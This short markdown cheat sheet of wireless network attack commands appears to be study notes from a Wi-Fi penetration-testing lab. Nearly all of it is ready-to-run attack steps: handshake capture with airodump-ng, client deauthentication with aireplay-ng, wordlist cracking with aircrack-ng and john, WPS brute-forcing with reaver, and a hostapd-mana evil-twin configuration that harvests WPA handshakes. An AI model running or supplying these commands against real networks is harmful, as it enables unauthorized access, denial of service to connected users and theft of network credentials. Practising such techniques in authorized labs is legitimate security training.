# Useful Wireshark Filter
0x08 means beacons
```wlan.fc.type_subtype == 0x08 && wlan.ssid == "<targetname>" ```

filter on bssid
```wlan.bssid == <bssid>```

# Capturing handshakes  

## Starting monitor mode  
```sudo airmon-ng start wlan0 ```

## Starting monitor mode and setting a channel  
```sudo airmon-ng start wlan0 3  ```

## Recon - see all  
```sudo airodump-ng wlan0mon```

## Recon specific (monitor channel 3)
```
sudo airmon-ng start wlan0 3
sudo airodump-ng -b <bssid> -e <essid> wlan0mon -w <fileprefix>
```
Then deauth from another shell or wifi card:
```sudo aireplay-ng -0 5 -a <BSSID> -c <client MAC> wlan0mon```

# Cracking handshakes

## Aircrack-ng
```aircrack-ng -w <path to wordlist> -e <ESSID> -b <BSSID> <capture filename>```

Aircrack with john rules
```sudo john --wordlist=<path to wordlist> --rules --stdout | aircrack-ng -e <ESSID> -b <BSSID> -w <capture filename>```

# Cracking wps

## Recon
```sudo wash -i wlan0mon ```

## Attacks
```sudo reaver -b <bssid> -i wlan0mon -v```

May need -K  
```sudo reaver -b <bssid> -i wlan0mon -v -K```

# Evil Twin with hostapd-mana
Wiki: https://github.com/sensepost/hostapd-mana/wiki

## PSK
```
interface=wlan0
ssid=groupB_target_3
channel=3
hw_mode=g
ieee80211n=1
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD
rsn_pairwise=CCMP
mana_wpaout=/home/kali/groupB_target_3.hccapx
```
